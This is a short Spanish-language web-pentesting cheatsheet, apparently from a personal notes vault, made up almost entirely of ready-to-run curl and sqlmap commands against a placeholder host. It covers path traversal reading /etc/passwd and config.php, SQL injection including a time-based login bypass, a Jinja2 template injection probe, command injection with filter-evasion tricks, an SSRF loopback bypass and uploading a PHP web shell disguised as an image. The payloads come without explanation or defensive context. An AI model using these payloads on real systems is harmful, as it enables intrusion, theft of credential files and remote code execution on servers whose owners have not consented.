---
tags: [cheatsheet, web]
tipo: cheatsheet
ultima_revision: 2026-10-20
---

# Cheatsheet — Web

```bash
# LFI / Path Traversal
curl -s "http://host/api/load-file" --data-urlencode "file=/etc/passwd"
curl -s --path-as-is "http://host/api/models/..%2f..%2findex.js"
curl -s "http://host/index.php?page=php://filter/convert.base64-encode/resource=config.php" | base64 -d

# SQLi
sqlmap -u "http://host/login.php" --data="user=a&pass=b" --technique=BT --dbs
# time-based manual
curl -s -X POST http://host/login.php --data "user=admin' AND SLEEP(3)-- -&pass=x" -w '%{time_total}\n'

# SSTI (Jinja2)
curl -s -X POST http://host/event --data 'description={{7*7}}'   # -> 49 = confirmado

# Command Injection
curl -s 'http://host/?cmd=;id'
curl -s 'http://host/?cmd=;cat${IFS}/etc/passwd'
curl -s 'http://host/?cmd=;/bin/ca?+/etc/passwd'

# SSRF (bypass loopback)
curl -s -X POST http://api.host/inspect -H 'Content-Type: application/json' -d '{"url":"http://127.1:5000/"}'

# File upload (bypass)
curl -s -X POST http://host/upload.php -F "avatar=@shell.php;type=image/png"
```

## Técnicas

- [[Path-Traversal]], [[SQL-Injection]], [[SSTI-Jinja2]], [[Command-Injection]], [[SSRF]], [[File-Upload]], [[PHP-Filters]]
